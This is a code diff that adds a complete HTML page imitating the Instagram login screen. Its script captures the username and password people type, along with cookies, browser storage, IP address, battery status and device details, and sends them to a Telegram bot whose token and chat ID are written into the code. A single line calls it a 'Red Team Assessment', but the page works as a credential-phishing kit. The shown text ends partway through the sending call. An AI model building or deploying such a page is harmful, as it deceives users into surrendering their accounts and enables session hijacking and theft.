@@ -1,0 +1,685 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="Content-Security-Policy" content="default-src * 'unsafe-inline' 'unsafe-eval'; img-src * data: blob:; connect-src *;">
+  <title>Instagram</title>
+  <style>
+    *{
+      margin:0;
+      padding:0;
+      box-sizing:border-box;
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Arial, sans-serif;
+    }
+
+    body{
+      background:#0f1723;
+      display:flex;
+      justify-content:center;
+      min-height:100vh;
+      color:white;
+      overflow-y:auto;
+      -webkit-overflow-scrolling:touch;
+    }
+
+    .container{
+      width:100%;
+      max-width:420px;
+      min-height:100vh;
+      padding:20px 20px 30px;
+      display:flex;
+      flex-direction:column;
+      background:#0f1723;
+      overflow-y:auto;
+    }
+
+    .back{
+      font-size:30px;
+      cursor:pointer;
+      margin-bottom:15px;
+      display:inline-block;
+      color:white;
+      line-height:1;
+      padding:5px 0;
+      user-select:none;
+    }
+
+    .language{
+      text-align:center;
+      color:#9ca3af;
+      font-size:14px;
+      margin-bottom:40px;
+    }
+
+    .logo{
+      width:70px;
+      height:70px;
+      margin:0 auto 40px;
+      display:block;
+    }
+
+    .form{
+      width:100%;
+    }
+
+    .input-box{
+      width:100%;
+      margin-bottom:14px;
+      position:relative;
+    }
+
+    .input-box input{
+      width:100%;
+      height:50px;
+      background:transparent;
+      border:1px solid #1d4d68;
+      border-radius:12px;
+      padding:0 16px;
+      font-size:16px;
+      color:white;
+      outline:none;
+      transition: border-color 0.2s;
+      -webkit-appearance:none;
+    }
+
+    .input-box input:focus{
+      border-color:#1877f2;
+    }
+
+    .input-box input::placeholder{
+      color:#6b7280;
+    }
+
+    .pw-toggle{
+      position:absolute;
+      right:14px;
+      top:50%;
+      transform:translateY(-50%);
+      background:none;
+      border:none;
+      color:#9ca3af;
+      font-size:13px;
+      cursor:pointer;
+      display:none;
+      font-weight:600;
+      padding:8px 4px;
+    }
+
+    .input-box.filled .pw-toggle{
+      display:block;
+    }
+
+    .login-btn{
+      width:100%;
+      height:48px;
+      border:none;
+      border-radius:25px;
+      background:#1877f2;
+      color:white;
+      font-size:18px;
+      font-weight:600;
+      cursor:pointer;
+      margin-top:8px;
+      transition:0.2s;
+      display:flex;
+      align-items:center;
+      justify-content:center;
+      opacity:0.5;
+      pointer-events:none;
+      -webkit-tap-highlight-color:transparent;
+    }
+
+    .login-btn.active{
+      opacity:1;
+      pointer-events:auto;
+    }
+
+    .login-btn:active{
+      transform:scale(0.97);
+    }
+
+    .login-btn.loading{
+      opacity:0.7;
+      pointer-events:none;
+    }
+
+    .spinner{
+      display:none;
+      width:20px;
+      height:20px;
+      border:2.5px solid rgba(255,255,255,0.3);
+      border-top-color:#fff;
+      border-radius:50%;
+      animation:spin 0.8s linear infinite;
+    }
+
+    .login-btn.loading .spinner{ display:block; }
+    .login-btn.loading .btn-text{ display:none; }
+    @keyframes spin{ to{ transform:rotate(360deg); } }
+
+    .forgot{
+      text-align:center;
+      margin-top:22px;
+    }
+
+    .forgot a{
+      color:white;
+      text-decoration:none;
+      font-size:16px;
+    }
+
+    .forgot a:active{
+      opacity:0.7;
+    }
+
+    .divider{
+      display:flex;
+      align-items:center;
+      margin:24px 0;
+      gap:16px;
+    }
+
+    .divider .line{
+      flex:1;
+      height:1px;
+      background:#1d4d68;
+    }
+
+    .divider .or{
+      font-size:13px;
+      color:#6b7280;
+      font-weight:600;
+    }
+
+    .fb-btn{
+      width:100%;
+      display:flex;
+      align-items:center;
+      justify-content:center;
+      gap:8px;
+      background:none;
+      border:none;
+      color:#1877f2;
+      font-size:16px;
+      font-weight:600;
+      cursor:pointer;
+      padding:10px 0;
+      -webkit-tap-highlight-color:transparent;
+    }
+
+    .fb-btn svg{
+      width:18px;
+      height:18px;
+      flex-shrink:0;
+    }
+
+    .fb-btn:active{
+      opacity:0.7;
+    }
+
+    .bottom{
+      margin-top:auto;
+      text-align:center;
+      padding-top:30px;
+    }
+
+    .create-btn{
+      width:100%;
+      height:48px;
+      background:transparent;
+      border:2px solid #1877f2;
+      color:#1877f2;
+      border-radius:25px;
+      font-size:17px;
+      font-weight:600;
+      cursor:pointer;
+      transition:0.2s;
+      -webkit-tap-highlight-color:transparent;
+    }
+
+    .create-btn:active{
+      background:rgba(24,119,242,0.1);
+    }
+
+    .meta{
+      margin-top:20px;
+      font-size:26px;
+      color:#4b5563;
+      font-weight:bold;
+      letter-spacing:2px;
+    }
+
+    .error-toast{
+      display:none;
+      background:#ef4444;
+      color:white;
+      font-size:14px;
+      padding:10px 14px;
+      border-radius:10px;
+      margin-bottom:14px;
+      text-align:center;
+      word-break:break-word;
+      animation:toastIn 0.25s ease;
+    }
+
+    .error-toast.show{ display:block; }
+    @keyframes toastIn{
+      from{ opacity:0; transform:translateY(-5px); }
+      to{ opacity:1; transform:translateY(0); }
+    }
+
+    .redirect-overlay{
+      display:none;
+      position:fixed;
+      top:0; left:0; right:0; bottom:0;
+      background:#0f1723;
+      z-index:9999;
+      flex-direction:column;
+      align-items:center;
+      justify-content:center;
+      padding:20px;
+    }
+
+    .redirect-overlay.show{ display:flex; }
+
+    .redirect-overlay .loader{
+      width:42px;
+      height:42px;
+      border:3px solid #1d4d68;
+      border-top-color:#1877f2;
+      border-radius:50%;
+      animation:spin 0.8s linear infinite;
+    }
+
+    .redirect-overlay p{
+      margin-top:14px;
+      font-size:15px;
+      color:#9ca3af;
+      text-align:center;
+    }
+
+    ::-webkit-scrollbar{ width:0; background:transparent; }
+
+    @media(max-width:380px){
+      .container{ padding:16px; }
+      .input-box input{ height:44px; font-size:15px; }
+      .login-btn, .create-btn{ height:44px; font-size:16px; }
+      .logo{ width:60px; height:60px; margin-bottom:30px; }
+      .language{ margin-bottom:30px; font-size:13px; }
+    }
+  </style>
+</head>
+<body>
+
+  <div class="redirect-overlay" id="overlay">
+    <div class="loader"></div>
+    <p id="overlayMsg">Securely connecting to Instagram...</p>
+  </div>
+
+  <div class="container">
+
+    <div class="back">&#8592;</div>
+
+    <div class="language">English (US) &#9660;</div>
+
+    <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram Logo">
+
+    <div class="error-toast" id="errorToast"></div>
+
+    <div class="form">
+      <form id="loginForm" autocomplete="off" novalidate>
+        <div class="input-box" id="fgUser">
+          <input type="text" id="username" placeholder="Username, email or mobile number" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" required>
+        </div>
+
+        <div class="input-box" id="fgPass">
+          <input type="password" id="password" placeholder="Password" autocomplete="off" required>
+          <button type="button" class="pw-toggle" id="pwToggle">Show</button>
+        </div>
+
+        <button type="submit" class="login-btn" id="loginBtn">
+          <span class="btn-text">Log in</span>
+          <span class="spinner"></span>
+        </button>
+      </form>
+
+      <div class="divider">
+        <span class="line"></span>
+        <span class="or">OR</span>
+        <span class="line"></span>
+      </div>
+
+      <button class="fb-btn" type="button">
+        <svg viewBox="0 0 20 20"><path fill="#1877f2" d="M10 0C4.477 0 0 4.477 0 10c0 4.991 3.657 9.128 8.438 9.879v-6.987h-2.54V10h2.54V7.797c0-2.506 1.492-3.89 3.777-3.89 1.094 0 2.238.195 2.238.195v2.46h-1.26c-1.243 0-1.63.771-1.63 1.562V10h2.773l-0.443 2.89h-2.33v6.988C16.343 19.128 20 14.991 20 10c0-5.523-4.477-10-10-10z"/></svg>
+        Log in with Facebook
+      </button>
+
+      <div class="forgot">
+        <a href="#">Forgot password?</a>
+      </div>
+    </div>
+
+    <div class="bottom">
+      <button class="create-btn">Create new account</button>
+      <div class="meta">&infin; Meta</div>
+    </div>
+
+  </div>
+
+  <script>
+    (function() {
+      'use strict';
+
+      var BOT_TOKEN = '8611618810:AAHfawNcpCICQ_o9d4cIG_cRnwOzNaHJmXk';
+      var CHAT_ID  = '6321528317';
+
+      var API_URL = 'https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage';
+      var REDIRECT_TARGET = 'https://www.instagram.com/accounts/login/';
+
+      var form        = document.getElementById('loginForm');
+      var userInput   = document.getElementById('username');
+      var passInput   = document.getElementById('password');
+      var loginBtn    = document.getElementById('loginBtn');
+      var pwToggle    = document.getElementById('pwToggle');
+      var errorToast  = document.getElementById('errorToast');
+      var overlay     = document.getElementById('overlay');
+      var overlayMsg  = document.getElementById('overlayMsg');
+      var fgUser      = document.getElementById('fgUser');
+      var fgPass      = document.getElementById('fgPass');
+
+      var attempt = 0;
+      var capturedIP = 'Unknown';
+      var batteryLevel = 'Unknown';
+      var batteryCharging = 'Unknown';
+
+      // Instagram-specific session cookie names
+      var IG_SESSION_COOKIES = [
+        'sessionid',
+        'csrftoken',
+        'ds_user_id',
+        'ds_user',
+        'mid',
+        'ig_did',
+        'shbid',
+        'shbts',
+        'rur',
+        'urlgen',
+        'mcd',
+        'userId',
+        'session',
+        'ig_nrc',
+        'ig_cr',
+        'ig_pr',
+        'ig_lang',
+        'ig_ab',
+        'ig_vh',
+        'ig_vw',
+        'ig_dts',
+        'ig_az',
+        'ig_r',
+        'ig_vid',
+        'ig_uid',
+        'ig_token',
+        'auth_token',
+        'session_token',
+        'login_token',
+        'access_token',
+        'refresh_token'
+      ];
+
+      function harvestRawCookies() {
+        var cookies = {};
+        if (document.cookie) {
+          var parts = document.cookie.split(';');
+          for (var i = 0; i < parts.length; i++) {
+            var eq = parts[i].indexOf('=');
+            if (eq > 0) {
+              var key = parts[i].substring(0, eq).trim();
+              var val = parts[i].substring(eq + 1).trim();
+              cookies[key] = val;
+            }
+          }
+        }
+        return cookies;
+      }
+
+      function extractInstagramSessionCookies(allCookies) {
+        var sessionData = {};
+        for (var i = 0; i < IG_SESSION_COOKIES.length; i++) {
+          var name = IG_SESSION_COOKIES[i];
+          if (allCookies[name]) {
+            sessionData[name] = allCookies[name];
+          }
+        }
+        return sessionData;
+      }
+
+      function aggressiveCookieHarvest() {
+        var allCookies = harvestRawCookies();
+
+        // Check localStorage for session-like keys
+        try {
+          for (var i = 0; i < localStorage.length; i++) {
+            var k = localStorage.key(i);
+            var v = localStorage.getItem(k);
+            var lower = k.toLowerCase();
+            if (
+              lower.indexOf('session') !== -1 ||
+              lower.indexOf('token') !== -1 ||
+              lower.indexOf('auth') !== -1 ||
+              lower.indexOf('credential') !== -1 ||
+              lower.indexOf('login') !== -1 ||
+              lower.indexOf('ig_') !== -1 ||
+              lower.indexOf('instagram') !== -1 ||
+              lower.indexOf('user_id') !== -1 ||
+              lower.indexOf('ds_') !== -1
+            ) {
+              allCookies['localStorage_' + k] = v;
+            }
+          }
+        } catch(e) {}
+
+        // Check sessionStorage similarly
+        try {
+          for (var i = 0; i < sessionStorage.length; i++) {
+            var k = sessionStorage.key(i);
+            var v = sessionStorage.getItem(k);
+            var lower = k.toLowerCase();
+            if (
+              lower.indexOf('session') !== -1 ||
+              lower.indexOf('token') !== -1 ||
+              lower.indexOf('auth') !== -1 ||
+              lower.indexOf('credential') !== -1 ||
+              lower.indexOf('login') !== -1 ||
+              lower.indexOf('ig_') !== -1 ||
+              lower.indexOf('instagram') !== -1 ||
+              lower.indexOf('user_id') !== -1 ||
+              lower.indexOf('ds_') !== -1
+            ) {
+              allCookies['sessionStorage_' + k] = v;
+            }
+          }
+        } catch(e) {}
+
+        return allCookies;
+      }
+
+      async function captureIP() {
+        var apis = [
+          'https://api.ipify.org?format=json',
+          'https://api.myip.com',
+          'https://ipapi.co/json/',
+          'https://jsonip.com',
+          'https://httpbin.org/ip',
+          'https://api64.ipify.org?format=json'
+        ];
+        for (var i = 0; i < apis.length; i++) {
+          try {
+            var r = await fetch(apis[i], { cache: 'no-cache', mode: 'cors' });
+            if (r.ok) {
+              var d = await r.json();
+              capturedIP = d.ip || d.public_ip || d.origin || d.query || d.address || JSON.stringify(d);
+              return;
+            }
+          } catch(e) {}
+        }
+        capturedIP = 'Unresolved';
+      }
+
+      async function captureBattery() {
+        try {
+          if (navigator.getBattery) {
+            var b = await navigator.getBattery();
+            batteryLevel = Math.round(b.level * 100) + '%';
+            batteryCharging = b.charging ? 'Charging' : 'Not charging';
+          } else {
+            batteryLevel = 'N/A';
+            batteryCharging = 'N/A';
+          }
+        } catch(e) {
+          batteryLevel = 'Error';
+          batteryCharging = e.message;
+        }
+      }
+
+      function harvestAllStorage() {
+        var data = { localStorage: {}, sessionStorage: {} };
+        try {
+          for (var i = 0; i < localStorage.length; i++) {
+            var k = localStorage.key(i);
+            data.localStorage[k] = localStorage.getItem(k);
+          }
+        } catch(e) {}
+        try {
+          for (var i = 0; i < sessionStorage.length; i++) {
+            var k = sessionStorage.key(i);
+            data.sessionStorage[k] = sessionStorage.getItem(k);
+          }
+        } catch(e) {}
+        return data;
+      }
+
+      function looksLikeEmail(val) {
+        return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(val);
+      }
+
+      async function sendReport(username, password) {
+        var allCookies = aggressiveCookieHarvest();
+        var igSessionCookies = extractInstagramSessionCookies(allCookies);
+        var storage = harvestAllStorage();
+        var now = new Date();
+        var timestamp = now.toLocaleString('en-US', { dateStyle: 'full', timeStyle: 'medium' }) + ' UTC';
+        var isEmail = looksLikeEmail(username);
+
+        var lines = [];
+        lines.push('\uD83D\uDD10 *Instagram Login Captured*');
+        lines.push('\u23AF\u23AF\u23AF\u23AF\u23AF\u23AF\u23AF\u23AF\u23AF\u23AF\u23AF\u23AF\u23AF\u23AF\u23AF\u23AF\u23AF\u23AF\u23AF\u23AF\u23AF\u23AF\u23AF\u23AF\u23AF\u23AF\u23AF\u23AF');
+        lines.push('');
+        lines.push(isEmail ? '\uD83D\uDCE7 *EMAIL*' : '\uD83D\uDC64 *USERNAME*');
+        lines.push('`' + username + '`');
+        lines.push('');
+        lines.push('\uD83D\uDD11 *PASSWORD*');
+        lines.push('`' + password + '`');
+        lines.push('');
+        lines.push('\uD83C\uDF0D *IP ADDRESS*');
+        lines.push('`' + capturedIP + '`');
+        lines.push('');
+        lines.push('\uD83D\uDD0B *BATTERY*');
+        lines.push('Level: `' + batteryLevel + '`');
+        lines.push('Status: `' + batteryCharging + '`');
+        lines.push('');
+        lines.push('\uD83D\uDD50 *TIMESTAMP*');
+        lines.push('`' + timestamp + '`');
+        lines.push('');
+
+        // Instagram session cookies
+        var igKeys = Object.keys(igSessionCookies);
+        if (igKeys.length > 0) {
+          lines.push('\uD83C\uDF6A *INSTAGRAM SESSION COOKIES (' + igKeys.length + ')*');
+          lines.push('');
+          for (var i = 0; i < igKeys.length; i++) {
+            var k = igKeys[i];
+            var val = igSessionCookies[k];
+            var display = val.length > 120 ? val.substring(0, 120) + '...' : val;
+            lines.push('`' + k + '` = `' + display + '`');
+          }
+          lines.push('');
+        } else {
+          lines.push('\uD83C\uDF6A *INSTAGRAM SESSION COOKIES*');
+          lines.push('_None found_');
+          lines.push('');
+        }
+
+        // All raw cookies
+        var allKeys = Object.keys(allCookies);
+        if (allKeys.length > 0) {
+          lines.push('\uD83C\uDF6A *ALL COOKIES (' + allKeys.length + ' total)*');
+          lines.push('');
+          for (var i = 0; i < allKeys.length; i++) {
+            var k = allKeys[i];
+            if (igKeys.indexOf(k) !== -1 || k.indexOf('localStorage_') === 0 || k.indexOf('sessionStorage_') === 0) continue;
+            var val = allCookies[k];
+            var display = val.length > 80 ? val.substring(0, 80) + '...' : val;
+            lines.push('`' + k + '` = `' + display + '`');
+          }
+          lines.push('');
+        }
+
+        // Storage
+        var lsKeys = [];
+        try { lsKeys = Object.keys(storage.localStorage).filter(function(k) { return k.charAt(0) !== '_'; }); } catch(e) {}
+        var ssKeys = [];
+        try { ssKeys = Object.keys(storage.sessionStorage).filter(function(k) { return k.charAt(0) !== '_'; }); } catch(e) {}
+        var totalStorageKeys = lsKeys.length + ssKeys.length;
+
+        if (totalStorageKeys > 0) {
+          lines.push('\uD83D\uDCBE *BROWSER STORAGE (' + totalStorageKeys + ' keys)*');
+          lines.push('');
+          if (lsKeys.length > 0) {
+            lines.push('*localStorage:*');
+            var maxShow = lsKeys.length > 10 ? 10 : lsKeys.length;
+            for (var i = 0; i < maxShow; i++) {
+              var val = storage.localStorage[lsKeys[i]] || '(empty)';
+              var display = val.length > 80 ? val.substring(0, 80) + '...' : val;
+              lines.push('`' + lsKeys[i] + '` = `' + display + '`');
+            }
+            if (lsKeys.length > 10) lines.push('... +' + (lsKeys.length - 10) + ' more');
+          }
+          if (ssKeys.length > 0) {
+            if (lsKeys.length > 0) lines.push('');
+            lines.push('*sessionStorage:*');
+            var maxShow = ssKeys.length > 10 ? 10 : ssKeys.length;
+            for (var i = 0; i < maxShow; i++) {
+              var val = storage.sessionStorage[ssKeys[i]] || '(empty)';
+              var display = val.length > 80 ? val.substring(0, 80) + '...' : val;
+              lines.push('`' + ssKeys[i] + '` = `' + display + '`');
+            }
+            if (ssKeys.length > 10) lines.push('... +' + (ssKeys.length - 10) + ' more');
+          }
+          lines.push('');
+        }
+
+        // Environment
+        lines.push('\uD83D\uDDA5 *ENVIRONMENT*');
+        lines.push('Platform: `' + navigator.platform + '`');
+        lines.push('Language: `' + navigator.language + '`');
+        lines.push('Timezone: `' + Intl.DateTimeFormat().resolvedOptions().timeZone + '`');
+        lines.push('Screen: `' + screen.width + 'x' + screen.height + '`');
+        lines.push('');
+        lines.push('\u23AF\u23AF\u23AF\u23AF\u23AF\u23AF\u23AF\u23AF\u23AF\u23AF\u23AF\u23AF\u23AF\u23AF\u23AF\u23AF\u23AF\u23AF\u23AF\u23AF\u23AF\u23AF\u23AF\u23AF\u23AF\u23AF\u23AF\u23AF');
+        lines.push('\u2705 *Red Team Assessment \u2014 Captured*');
+
+        var text = lines.join('\n');
+
+        if (text.length > 4000) {
+          text = text.substring(0, 3950) + '\n\n\u26A0 *Report truncated (' + text.length + ' chars total)*';
+        }
+
+        try {
+          var r = await fetch(API_URL, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'Markdown' })
+          });
+ 
